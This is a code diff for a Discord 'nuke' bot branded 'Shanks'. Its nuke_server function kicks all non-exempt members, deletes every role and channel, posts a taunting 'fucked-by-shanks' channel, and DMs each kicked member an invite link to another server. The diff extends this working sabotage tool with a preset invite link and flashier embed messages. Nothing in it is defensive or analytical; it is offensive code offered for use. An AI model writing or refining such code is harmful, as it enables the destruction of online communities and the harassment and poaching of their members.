@@ -24,39 +24,37 @@ async def delete_channel(channel: discord.abc.GuildChannel):
     except:
         pass
 
-async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.User):
+async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.User, invite_link: str = None):
     """
     Nuke a server with full process:
-    1. Create invite link (from a text channel, or create temp)
+    1. Use provided invite link (or create one)
     2. Kick all members (except bot and allowed users) with 1/sec delay,
        and send DM with invite link.
     3. Delete all roles (except @everyone) with 0.5 sec delay.
     4. Delete all channels, then create new text channel "fucked-by-shanks💀".
     """
-    # Step 0: Create an invite link
-    invite_link = None
-    # Try to find a text channel to create invite
-    text_channel = next((c for c in guild.channels if isinstance(c, discord.TextChannel)), None)
-    if text_channel is None:
-        # No text channel? Create a temporary one (will be deleted later)
-        try:
-            temp_channel = await guild.create_text_channel("temp-invite")
-            invite = await temp_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
-            invite_link = invite.url
-        except:
-            pass
-    else:
-        try:
-            invite = await text_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
-            invite_link = invite.url
-        except:
-            pass
+    # Step 0: Use provided invite link or create one
+    if not invite_link:
+        # Try to create an invite link
+        text_channel = next((c for c in guild.channels if isinstance(c, discord.TextChannel)), None)
+        if text_channel is None:
+            try:
+                temp_channel = await guild.create_text_channel("temp-invite")
+                invite = await temp_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
+                invite_link = invite.url
+            except:
+                pass
+        else:
+            try:
+                invite = await text_channel.create_invite(max_age=0, max_uses=0, reason="Nuke invite")
+                invite_link = invite.url
+            except:
+                pass
 
     if not invite_link:
         invite_link = "No invite could be created."
 
     # Step 1: Kick members
-    # Skip bot itself, the commander (user), and any allowed users (from .env)
     allowed_ids = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
     members_to_kick = [
         m for m in guild.members
@@ -67,9 +65,18 @@ async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.U
     for member in members_to_kick:
         try:
             dm = await member.create_dm()
-            await dm.send(f"Server Nuked by Shanks\nJoin {invite_link} for more information 👺")
+            embed = discord.Embed(
+                title="💀 Server Nuked!",
+                description=f"**{guild.name}** has been nuked by Shanks!",
+                color=discord.Color.red()
+            )
+            embed.add_field(name="🔗 Join Here", value=f"[Click to join]({invite_link})", inline=False)
+            embed.add_field(name="🔥 Reason", value="Nuked by Shanks 💀", inline=True)
+            embed.set_footer(text="👺 Join for more information!")
+            await dm.send(embed=embed)
         except:
             pass
+        
         await kick_member(member)
         await asyncio.sleep(1)  # rate limit
 
@@ -87,13 +94,30 @@ async def nuke_server(guild: discord.Guild, bot: discord.Client, user: discord.U
     # Step 4: Create new channel
     try:
         new_channel = await guild.create_text_channel("fucked-by-shanks💀")
-        await new_channel.send("This server has been nuked by Shanks 💀")
+        embed = discord.Embed(
+            title="💀 SERVER NUKED!",
+            description="This server has been destroyed by Shanks!",
+            color=discord.Color.red()
+        )
+        embed.add_field(name="🔥 By", value="Shanks 💀", inline=True)
+        embed.add_field(name="📅 Date", value=discord.utils.utcnow().strftime("%Y-%m-%d %H:%M:%S"), inline=True)
+        embed.set_footer(text="👺 Join the destruction!")
+        await new_channel.send(embed=embed)
     except:
         pass
 
     # Notify commander
     try:
         dm = await user.create_dm()
-        await dm.send(f"✅ Nuke complete on **{guild.name}**!\nInvite link: {invite_link}")
+        embed = discord.Embed(
+            title="✅ NUKE COMPLETE!",
+            description=f"Successfully nuked **{guild.name}**!",
+            color=discord.Color.green()
+        )
+        embed.add_field(name="👥 Members Kicked", value=len(members_to_kick), inline=True)
+        embed.add_field(name="🔗 Invite Link", value=f"[Click to join]({invite_link})", inline=False)
+        embed.set_footer(text="🔥 Shanks Nuke Bot")
+        embed.timestamp = discord.utils.utcnow()
+        await dm.send(embed=embed)
     except:
         pass
